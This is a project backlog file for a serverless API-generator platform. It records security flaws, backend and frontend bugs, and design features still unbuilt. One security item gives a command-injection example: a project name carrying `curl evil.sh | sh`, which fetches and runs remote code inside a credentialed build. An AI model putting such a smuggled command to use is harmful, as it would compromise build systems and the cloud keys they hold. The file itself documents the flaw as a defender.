# TODO

Known bugs and security concerns found while adding the unit test suites (2026-10-15).
Tests currently **document** the existing behaviour for the bugs below; fixing a bug will mean updating the matching test.

## Security

### Critical

- [ ] **No authentication or authorization on the API.** No function in `backend-service/serverless.yml` has an authorizer, and CORS is `*`. Anyone who knows the URL can list, edit and delete projects. `DELETE /project/{id}` also tears down the project's CloudFormation stack and empties its S3 buckets.
- [ ] **The login is fake.** `frontend-service/src/Login/action.ts:8` compares against hard-coded `admin` / `password` in the browser. It protects nothing, because the API is open (see above).
- [x] **Command injection into CodeBuild.** The project name is interpolated unescaped into a shell command in the buildspec (`node ./docs.js -p ${projectName}`, `deploymentEvent.ts:118`). A project named e.g. `x; curl evil.sh | sh` runs arbitrary commands inside a build that holds the platform's AWS keys. The project name is only validated as `min(3)` (`project.dto.ts`). Fixed: the name reaches the build as the `PROJECT_NAME` environment variable (`"$PROJECT_NAME"` in the buildspec), project names must match the new rule (`src/utils/names.ts`), and deploys refuse projects saved under the old rules.
- [x] **Code and template injection through model metadata.** Model names, property names and types, and relations are pasted into generated TypeScript (function names, bodies, JSDoc) and `serverless.yml` (`codeBuilder.ts`, `modelEvent.ts`). Names are only validated as `min(3)` and property names/types not at all, so a crafted name can inject code into the deployed service. Restrict names to identifier-safe characters (e.g. `/^[A-Za-z][A-Za-z0-9]*$/`) and types to an enum. Fixed: models must be PascalCase, fields camelCase, types `string`/`number`/`boolean` (`src/utils/names.ts`); `SetupAPIFunction` refuses unsafe models and deploys refuse models saved under the old rules.
- [x] **Static AWS credentials are spread around.** `AWS_KEY`/`AWS_SECRET` are plain Lambda environment variables used in place of the execution role. They are also written into the CodeBuild `buildspecOverride` `env.variables` (`deploymentEvent.ts:103`), where anyone with `codebuild:BatchGetBuilds` can read them in the build definition. Use IAM roles (the Lambda execution role, plus a CodeBuild service role) and drop the keys. Fixed: the keys are gone; Lambdas use their execution role, builds use `DeployProjectRole`, and local emulators get dummy credentials. The old keys still need to be rotated and deactivated in IAM.
- [x] **The control-plane IAM role is `Action: "*"`, `Resource: "*"`** (`serverless.yml:34`). Scope it to the tables, buckets, Lambda, CodeBuild, CloudFormation and Cost Explorer calls actually used. Fixed: each statement covers one group of calls; generated stacks are created and deleted through `CfnExecutionRole`.

### High

- [ ] **Build logs are served unauthenticated.** `GET /deployment/{projectId}` returns the full CodeBuild/CloudWatch log, which can include secrets echoed by the build.
- [ ] **Path parameters are unvalidated.** `projectId` goes straight into S3 keys (e.g. `projectId + "/swagger-json.json"` in `deployment.ts`) and DynamoDB keys. Validate ids as UUIDs.
- [ ] **Cost Explorer can be abused.** `GET /project/cost/{id}` calls Cost Explorer (billed per request) with no authentication or rate limit.
- [ ] **Unbounded scan size.** `GET /project?take=` passes a user-supplied `Limit` to a table Scan (`project.ts:89`). Clamp it.
- [ ] **Generated APIs are public.** Services deployed for users have no authorizer, and CORS is `*` (`boilerplate/serverless.yml`, `boilerplate/src/utils/responseManager.ts`). Anyone with the URL can read and write their data. (The API Docs design assumes bearer-token auth; see "Features in the designs".)

## Backend bugs

- [ ] **`DeleteModel` updates the wrong item and can resurrect the deleted model** (`model.ts:696-711`). For each related model it writes the filtered relations to `sk = ml_<deleted model id>` (the model being deleted), not the related model. That update runs in `Promise.all` with the `DeleteCommand` on the same key, and `UpdateItem` upserts, so a ghost item can be left behind. Related models also keep dangling relations to the deleted model.
- [ ] **Invalid CloudFormation for model tables.** `modelCreatedHandler` puts `Tags` at the resource level instead of under `Properties` (`modelEvent.ts:90`). CloudFormation rejects that ("Invalid template resource property 'Tags'"). `modelUpdatedHandler` then re-creates the resource without any tags, so cost attribution by tag is lost after any update.
- [ ] **Cost period dates are wrong outside UTC and on the 1st.** `getStackCurrentCost`/`getStackMonthlyCost` build local-midnight dates and format them with `toISOString()` (`infraHelper.ts:207,246`), which shifts them to the previous day in UTC+ timezones. On the 1st of the month `Start === End` for the current cost, which Cost Explorer rejects.
- [ ] **`deleteFolder` deletes the wrong zip** for a prefix ending in `/`: `prefix.substring(0, prefix.indexOf("/") - 1)` drops the last character (`proj/` becomes `pro.zip`) (`S3Client.ts:119`). It also only deletes the first 1,000 objects (no pagination).
- [ ] **Name and id collisions.**
  - `getServiceName`/`getTableName` keep only the last 6 hex chars of the project id (`substring(26)`). Service, stack and table names can collide between projects; a 50% chance at about 5k projects.
  - ~~`getTableName` only removes the first space (`replace(" ", "")`).~~ Fixed: it removes every space.
  - ~~The duplicate-model check is case-sensitive, so `User` and `user` map to the same table.~~ Fixed: model and field duplicate checks are case-insensitive, including renames in `PutModel`.
- [ ] **Stale files can be redeployed.** `deploymentTriggeredHandler` downloads into a fixed `/tmp/.downloads/<projectId>` that is never cleaned. Warm Lambdas re-zip files deleted from S3 since the last deploy, and `/tmp` fills up over time.
- [ ] **Stream leaks and crashes in `deploymentEvent.ts`.**
  - `downloadSourceCode` opens a write stream before checking for a null S3 body; it leaves an empty file and an open file handle (`:188`).
  - `zipFolder`'s output stream has no `error` listener, so a write error crashes the process (`:137`).
- [ ] **Model event handlers can fail half-way.** `modelDeletedHandler`/`modelUpdatedHandler` have no try/catch. In dev (`LocalEventHub`) the HTTP handler then returns 500 even though the DynamoDB write already succeeded.
- [ ] **`GetDeployment` can 500 on a successful deploy.** It `JSON.parse`s the swagger file whenever `apiId` is set. If the file is missing (`downloadFile` → `null` → `""`), the request fails with 500.
- [ ] **`TriggerDeployment` has a race.** `isDeploying` is only set to `true` later by the async event handler, so two quick triggers both start builds. `isDeploying` is only reset when someone calls `GetDeployment`.
- [ ] **`GetProjects` pagination is broken.** `Limit` applies before the `entityType` filter, so pages can be empty while `hasMore` is true. `nextPageToken` rebuilds `sk` from `pk`, which is wrong when the last evaluated item is a model or deployment row.
- [ ] **`CreateModelRelations` leaves stale back-references.** It replaces the main model's relations with the request body, but models dropped from the list keep their back-reference.
- [ ] **`LocalEventHub.publish` doesn't return after rejecting an unknown event**, so it goes on to dereference `undefined` (`eventhub.ts:64`).
- [ ] **Wrong names in error logs.** `GetOneProject`/`PutProject`/`DeleteProject` log as `GetProjects`, model handlers log as `GetModels`, `projectDeletedHandler` logs as `projectCreatedHandler`, and model delete/update log as `modelCreatedHandler`.
- [ ] **Typo in `MODEL_UPDATED`:** `"model upated"` (harmless, but it is part of the event contract).
- [ ] **`uuid` isn't declared in `backend-service/package.json`.** It only resolves because another package depends on it.
- [ ] **Outdated runtimes.** The control plane runs on `nodejs18.x` (end of life on Lambda), the generated services on `nodejs20.x`, and the buildspec installs `serverless@3` while the repo uses v4.
- [ ] **Unreachable guard in `deploymentEvent.ts`.** It checks `if (!response)` after `zipFolder`, which only ever resolves `true` or rejects. It is excluded from coverage with a `v8 ignore` hint.

## Frontend bugs

- [ ] **Stale relationships are never removed.** `relToDelete` is never filled: `editRelationship` only records the old relation when `field == "relatedModel"`, but the selects only edit `modelId` and `relationship` (`modelManager.tsx:210`). The cleanup PUT in `pushModelUpdate` therefore never runs. These paths are excluded from coverage with `v8 ignore` hints until they're fixed.
- [x] **Cancel buttons submit their forms.** In the "New Project" and "Edit Project" dialogs (`Projects.tsx:62`, `ProjectCard.tsx:99`), the Cancel buttons have no `type="button"`, so clicking Cancel also submits the form (an edit is sent with no `action`). Fixed: both are `type="button"`.
- [ ] **Loader errors crash the page.** On network errors the loaders call `alert()` and return `undefined` (`Project/loader.ts:11`, `ProjectDetail/loader.ts:28`). The pages then destructure `undefined` from `useLoaderData()` and crash. Throw, and use an `errorElement`.
- [x] **The API base URL is hard-coded to a staging endpoint** in every loader, action and `modelManager.tsx`. Moved to `VITE_API_URL` (`src/config.ts`).
- [ ] **Cost cards never show.** `ProjectDetails` renders cost cards from `bill`, but the loader's cost fetch is commented out (`ProjectDetail/loader.ts:16-19`).
- [ ] **`deleteRelationship` sends an extra field.** It sends `modelName`, which the backend schema doesn't define (it is stripped). For an unsaved row it sends `modelId: ""`.
- [ ] **Debug logging left in.** `console.log` runs on every `ModelManager` render and after creating a model.
- [ ] **Peer-dependency conflict.** `swagger-ui-react@5` declares `react <19`, but the app uses React 19. Installs need `--legacy-peer-deps` (set in `frontend-service/.npmrc`).
- [ ] **Existing lint errors.** `npm run lint` reports 7 `no-explicit-any` errors that predate the tests.

## Features in the designs that we don't have yet

These are shown in the Figma designs (`figma-screenshot/`, reviewed 2026-10-19) but aren't built. For each item, either build it or remove it from the design before the UI is implemented, so the UI doesn't promise things the product can't do. "BE" means backend work is needed, "FE" frontend only.

### Overall

- [ ] **Implement the redesign.** The current frontend is the old basic UI. Build the new app shell (sidebar, top bar, project header and tabs) and the screens below as shared components (status pill, cards, modals, toasts). FE
- [ ] **Shared app UI.** FE, and BE for notifications and search across all data.
  - ⌘K search and command palette ("Search resources…")
  - notifications bell
  - help menu
  - toasts
  - loading skeletons
  - 404 and error pages
- [ ] **Remove claims for features that don't exist** from the design copy, unless we decide to build them:
  - GraphQL endpoints, Postgres support, JWT verification, edge caching and "micro-VPC" (Projects empty state)
  - "OpenAPI 3.1" and typed client SDKs (we generate OpenAPI 3.0 with swagger-jsdoc)
  - "Auto-synced to Prisma / GraphQL AST" (API Docs empty state)
  - schema "migration scripts" (Data Model Editor)

### Accounts and authentication (Sign in, Sign up, Email verification)

- [ ] **Real user accounts.** Email/password sign-up and sign-in backed by an identity provider, e.g. Cognito. This also fixes the "fake login" and "no auth" security items above. BE + FE
- [ ] **Email verification** with a 6-digit code: resend with cooldown, expired and invalid code states. BE + FE
- [ ] **Forgot and reset password** (linked from Sign in). BE + FE
- [ ] **"Continue with Google" and "Continue with GitHub"** (OAuth). BE + FE
- [ ] **Workspaces and roles.**
  - workspace or org switcher (`acme-production`)
  - user roles (the "Owner" label)
  - members
  - projects scoped to a workspace (today every project is global)
  
  BE + FE
- [ ] **Account settings (sidebar → Settings).** Profile, change password, connected sign-in methods, active sessions, sign out. BE + FE
- [ ] **System status indicator** ("All systems normal" on Sign in). Needs a status source. BE + FE

### Projects dashboard and empty state

- [ ] **Richer project list API.** `GET /project` returns only name and description. Each card also needs:
  - latest deployment status (Not deployed, Deploying, Live, Failed)
  - model and endpoint counts
  - last deployed time
  - base URL
  - month-to-date cost
  
  Return these in one list response rather than one call per card. BE + FE
- [ ] **Filter and sort projects** ("Filter projects…", "Sort: Last modified"). Needs `updatedAt`/`createdAt` on project rows. BE + FE
- [ ] **Workspace metrics strip:** active instances, global API requests with trend, P95 latency, projected bill. Needs CloudWatch metrics across all generated services. BE + FE
- [ ] **Project templates** ("Explore templates", "Browse templates"). BE + FE
- [ ] **Import from an OpenAPI spec.** BE + FE
- [ ] **Quickstart and product documentation** ("View quickstart docs", sidebar Docs). Content + FE

### New project and Delete project modals

- [x] **Project name rule:** lowercase letters, numbers and hyphens, 3+ characters, enforced in `CreateProjectDtoSchema` as well as the UI. This also closes the command-injection item above. BE + FE
- [ ] **Per-project AWS region** ("AWS Deployment Region"). Today one global `AWS_DEPLOY_REGION` (default `eu-west-1`) applies to every project. BE + FE
- [ ] **Type-to-confirm delete** with an impact summary: data loss, infrastructure, billing stops. BE should report what will be removed (tables, functions, buckets). FE, plus BE for the summary

### Project header (all project tabs)

- [ ] **Environments or stages.** The breadcrumb shows `production`, but every deploy goes to the single stage `prod`. BE + FE
- [ ] **Pending changes count** on "Deploy changes (3)". Track model changes made since the last successful deploy. BE + FE
- [ ] **Header status follows the latest deployment** (Not deployed, Deploying, Live, Failed). FE, using existing data
- [ ] **Custom API domain** (`https://api.kanobi.dev/v1/shop-api`). Today it's the raw API Gateway URL (`https://<id>.execute-api.<region>.amazonaws.com/prod`). BE + infra
- [ ] **Project Settings tab:** rename, description, read-only deployment info, danger zone. FE, using existing `PUT`/`DELETE`

### Data Model Editor

- [ ] **Enforce "required" in generated APIs.** The flag is only written into the API docs. Generated `Post`/`Put` handlers in `boilerplate/src/indexTemplate.ts` don't validate the body. BE (boilerplate + codeBuilder)
- [x] **Validate model and field names** as identifier-safe (e.g. PascalCase models, camelCase fields). This also closes the code-injection item above. BE + FE
- [ ] **Save a model in one atomic call.** The UI shows one Save, but `pushModelUpdate` makes 3–4 separate requests (model, APIs, relations, relation deletes) that can partially fail. BE + FE
- [ ] **Entity-relationship diagram** of all models, with pan, zoom and expand. FE
- [ ] **Unsaved-changes tracking:** a dot per model, and a sticky footer with Discard and Save that is disabled while errors exist. FE
- [ ] **Show how relations are stored:** on the related record, a field named after the related model (`User` holds an id, or `id[]` on the many side). The design says "foreign key `userId`", which isn't what we generate. FE copy, or a BE change if we want `userId`-style keys

### Deployments

- [ ] **Deployment history.** Only one deployment record is kept per project (`dp_` row, overwritten on each deploy). Needs one record per deploy, with:
  - an id (e.g. `#dep-8493`)
  - who triggered it
  - start and end time, duration
  - status
  - a link to its logs
  
  plus "Load earlier deployments". BE + FE
- [ ] **4-stage tracker:** Queued → Install → Build → Deploy infrastructure, with elapsed time. `sls deploy` runs inside CodeBuild's BUILD phase, so to tell Build and Deploy apart, split the buildspec (move deploy to `post_build`) or emit log markers. BE + FE
- [ ] **Live log streaming** with auto-scroll, copy and download. Today the UI polls the whole log every 10 seconds. BE + FE
- [ ] **Failed deploy summary:** failed phase, first error excerpt, "Jump to error", "Retry deploy". FE, plus BE to extract the error
- [ ] **Cancel a running deploy.** Stop the CodeBuild build and reset `isDeploying`. BE + FE
- [ ] **Deploy from git** (commit, branch and repo in the design's log and status). We deploy generated source from S3. Remove from the design unless planned. BE + FE
- [ ] **Deployment velocity chart** (deploys per day, last 7 days). Needs deployment history. BE + FE

### API Docs

- [ ] **Custom docs explorer** replacing the embedded Swagger UI:
  - endpoint list grouped by model, with search
  - endpoint detail
  - "Try it" console with response status, time and size
  - code snippets: cURL, TypeScript, Python, Go
  
  FE
- [ ] **Authentication for generated APIs:** bearer token or API keys, with scopes (`users:write`) and a sandbox key (`kanobi_live_…`). See the "Generated APIs are public" security item. BE + FE
- [ ] **Rate limiting** (shown as "120 req / min") and **idempotency keys** on generated APIs. BE
- [ ] **Per-endpoint latency stats** ("Avg latency ~38 ms"). Needs CloudWatch metrics. BE + FE
- [ ] **Richer field schema:** enums, formats (email, uri), min length, defaults, nullable, and object and array field types. Today a field is only a name, a type (string/number/boolean) and a required flag. BE (DTOs, codegen, docs) + FE
- [ ] **More route shapes:** `PATCH`, nested routes (`/orders/{id}/status`), lower-case plural paths (`/users`). Today generated routes are the 7 fixed shapes per model, named as-is (`/User/{id}`, `/multiple-User/{ids}`). BE (codegen)
- [ ] **Pagination on list endpoints.** Generated `GET /<Model>` does a full table Scan with no limit or page token. BE (boilerplate)
- [ ] **Side effects in generated endpoints** (e.g. "triggers `user.created` event", "send welcome email" query flag). Not supported. Remove from the design unless planned. BE
- [ ] **Docs preview before the first deploy** (API Docs empty state). Generate the OpenAPI spec when models change, not only during the CodeBuild deploy. BE + FE

### Cost

- [ ] **Show cost in the UI at all.** The backend has `GET /project/cost/{id}`, but the frontend fetch is commented out (see "Cost cards never show" above). FE
- [ ] **Daily spend chart** with average and peak markers. Query Cost Explorer with `DAILY` granularity. BE + FE
- [ ] **Cost per AWS service** (Lambda, API Gateway, DynamoDB, S3, CloudWatch), filtered by the project's tag. BE + FE
- [ ] **Usage volume per service** (invocations, requests, read/write units, GB stored). Query Cost Explorer's `UsageQuantity` metric grouped by `USAGE_TYPE` (units differ per usage type, so don't sum them per service), or read CloudWatch metrics. BE + FE
- [ ] **Budgets and alerts** ("Allocated budget $50.00", % consumed). BE + FE
- [ ] **Cost tools:** date range picker, "vs previous cycle" trend, export to CSV, link to AWS Cost Management. BE + FE

## Design features we can't support

These are shown in the designs but can't be delivered as drawn, because of AWS limits or because they conflict with how Kanobi works (one DynamoDB table per model, Lambda + API Gateway, deploys through CodeBuild and CloudFormation). Change the design to the "show instead" version, rather than adding these to the backlog. Revisit only if the architecture changes.

- [ ] **Real-time or "today" cost.** Cost Explorer data lags up to 24 hours, and per-project cost depends on cost-allocation tags, which only apply from the day they are activated. Hourly data needs an opt-in, covers only 14 days and is billed. The Cost screen's "Hourly consolidated" spend and live "May 24: $0.73" therefore can't be exact.
  - **Show instead:** daily figures with an "Updated <time>, may lag up to 24h" note. Today is shown as partial.
- [ ] **"Billing terminates immediately" on delete** (Delete Project modal). CloudFormation deletes the stack asynchronously. Usage up to the deletion still bills, and it appears in Cost Explorer up to a day later.
  - **Show instead:** "Resources are removed within a few minutes. Charges already incurred will still be billed."
- [ ] **Cancelling a deploy at any point.** We can stop the CodeBuild build, but once `serverless deploy` has started a CloudFormation update, stopping the build doesn't stop the update. CloudFormation either finishes or rolls back on its own.
  - **Show instead:** allow Cancel only while the deploy is queued or building. During "Deploy infrastructure", show "Can't cancel — waiting for AWS to finish".
- [ ] **Migration scripts for schema changes** (Data Model Editor: "Modifying schema will stage a migration script"). Generated tables are schemaless DynamoDB tables. Changing a field's type or making it required doesn't touch existing items, and existing records are not rewritten.
  - **Show instead:** a warning when a change affects existing data, e.g. "Existing records keep their old values; new rules apply to new writes."
- [ ] **Postgres or relational data, and joins** (Projects empty state: "Postgres & DynamoDB primitives"). Generated services store each model in its own DynamoDB table and resolve relations by id lookups (`includes`). SQL databases, foreign-key constraints and joins would need a different code generator and runtime.
  - **Show instead:** describe the data layer as DynamoDB.
- [ ] **GraphQL endpoints** (Projects dashboard and empty state). Generated services are REST handlers behind API Gateway. GraphQL would need a separate generator (e.g. AppSync schemas and resolvers).
  - **Show instead:** REST only.
- [ ] **Isolated "micro-VPC" environments and edge caching** (Projects empty state: "Zero-config AWS", API Docs: "Direct edge proxy"). Generated Lambdas run outside a VPC behind a regional API Gateway in one shared AWS account. A VPC per project adds NAT cost and cold-start latency, and responses aren't cacheable at the edge (no cache headers, no CloudFront).
  - **Show instead:** "Serverless on AWS Lambda + API Gateway + DynamoDB".
